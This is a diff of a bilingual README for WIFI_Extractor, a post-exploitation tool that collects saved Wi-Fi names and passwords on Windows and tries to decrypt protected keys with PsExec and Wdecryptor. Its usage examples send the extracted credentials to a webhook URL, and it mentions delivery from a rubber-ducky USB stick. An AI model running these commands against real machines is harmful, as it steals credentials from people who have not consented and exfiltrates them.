@@ -1,10 +1,11 @@
 # WIFI_Extractor
 
-*DISCLAIMER*
+<b>*DISCLAIMER*
 
 This is not made for illegal or malicious purposes, I consider it like a post-exploitation tool with legal authority before of use in whatever location you are doing your pentest to check weak and reutilization of passwords, I'm not responsible of any malicious acts that you may do.
 
 Esto no está hecho con fines ilegales o maliciosos, lo considero como una herramienta de post-explotación con autoridad legal antes del uso en cualquier lugar donde esté haciendo su pentest para verificar la debilidad y la reutilización de contraseñas, no soy responsable de cualquier acto malicioso que puedas hacer.
+</b>
 
 if you run it with python you might need this requeriments
 
@@ -27,7 +28,7 @@ También se puede usar "offline", físicamente con un pendrive(rubber ducky).
 Puede detecar contraseñas protegidas localmente y tratar de descriptarlas, necesitaras al menos una cmd con privilegios de admin para tener mas probabilidad de éxito, luego con la ayuda de PsExec tratará de ejecutar wdecryptor con la key.
 
 
-Usage: E_WIFI.exe [OPTIONS]
+<b>Usage: E_WIFI.exe [OPTIONS]
 
 
 Options:
@@ -47,8 +48,9 @@ Options:
   --help              Show this message and exit.
   
   
+  </b>
 
-Offline
+<b>* Offline</b>
 
 python3 E_WIFIoffline.py
 
@@ -59,7 +61,7 @@ Creates a txt with the WIFI's ssid and passwords stored in the local machine
 
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 
-Online
+<b>Online</b>
 
 Usages
 
@@ -74,7 +76,7 @@ Creates a txt with the WIFI's ssid and passwords stored in the local machine
 
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 
-Another Example
+<b>Another Example</b>
 
 python3 E_WIFI.py -u https://webhook.site/yoururl -n -p 
 
@@ -83,11 +85,12 @@ CMD or Powershell E_WIFI.exe | ./E_WIFI.exe -u https://webhook.site/yoururl -n -
 type --help for more detailed info
 
 PD: 
+
     THE TXT IS CREATED BY DEFAULT -n TURN IT OFF
 
     EL TXT SE CREA POR DEFECTO -n APAGA LA CREACION
 
-V1.3 Examples
+<b>V1.3 and Wdecryptor Examples</b>
 
 Quick Example of the new function (in the following hours I will update a more detailed one)
 
@@ -105,6 +108,7 @@ You will see that in the webhook it will be sent with the decrypted password
 Podras ver en el webhook que sera enviado con la contrasena desencriptada
 ![ejemplo nueva funcion2](https://user-images.githubusercontent.com/74321905/225492226-b03d05e1-4f79-4f88-b872-04df838bc34d.png)
 
+<b>* Using Wdecryptor manually</b>
 
 Also you can use the E_WIFI to extract the keys and then manually use Wdecryptor with an opened system authority cmd
 
